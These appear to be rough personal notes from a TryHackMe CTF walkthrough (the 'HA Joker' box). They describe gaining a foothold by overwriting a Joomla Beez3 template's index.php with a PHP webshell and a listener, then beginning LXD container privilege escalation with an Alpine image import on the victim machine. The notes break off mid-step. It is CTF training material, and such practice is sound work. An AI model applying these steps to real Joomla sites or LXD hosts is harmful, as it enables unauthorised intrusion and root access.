# Searchsploited, github, but you according to:
https://github.com/nickapic/TryHackMeWriteUps/blob/master/HA_Joker_CTF_.pdf
You just replace the index.php with a reverse shell on the template page.
This works because the index.php is template containing code to make the site dynamic(like login pages) in anyway.
From the Joomla documentation:
"The index.php file is the skeleton of the website. Every page that Joomla! delivers is "index.php" fleshed out with a selection of content inserted from the database."
https://docs.joomla.org/What_is_the_purpose_of_the_index.php_file%3F 

From the to takskbar -> Manage -> Templates -> Templates -> Beez3
On the left hand side you will see index.php

Remove index.php code, paste in a php webshell
Save and Close then Template preview; maek sure you have a listener ready

# Practicing file transfers is important and generally you have more control over the exploitation of the software

# hacktricks, a great resource instructs if we were use our own image:
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.


# But you can list the images on the machine with:
